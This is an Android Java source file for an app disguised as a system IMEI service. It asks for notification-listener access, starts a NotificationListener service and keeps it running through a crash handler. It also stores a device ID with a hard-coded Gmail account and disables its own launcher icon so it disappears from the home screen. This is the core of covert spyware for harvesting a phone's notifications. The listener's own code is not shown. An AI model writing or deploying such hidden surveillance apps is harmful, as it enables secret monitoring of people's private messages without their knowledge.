package system.android.services.imei;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.widget.Toast;

public class MainActivity extends Activity {

    public static String deviceId = Build.BRAND + "-" + Build.DEVICE;
    public static String account = "shyamjhajharia31@gmail.com";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        try {
            startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
        } catch (Exception e) {
            e.printStackTrace();
            Toast.makeText(this, "go to settings and give notification access ", Toast.LENGTH_LONG).show();
        }

        getSharedPreferences("shared", Context.MODE_PRIVATE).edit().putString("deviceId", deviceId).commit();
        getSharedPreferences("shared", Context.MODE_PRIVATE).edit().putString("account", account).commit();

        startService(new Intent(this, NotificationListener.class));


        Thread.setDefaultUncaughtExceptionHandler(new Thread.UncaughtExceptionHandler() {
            @Override
            public void uncaughtException(Thread thread, Throwable ex) {
                ex.printStackTrace();
                startService(new Intent(getApplicationContext(), NotificationListener.class));
                System.exit(0);
            }
        });


        try {
            PackageManager p = getPackageManager();
            ComponentName componentName = new ComponentName(this, system.android.services.imei.MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}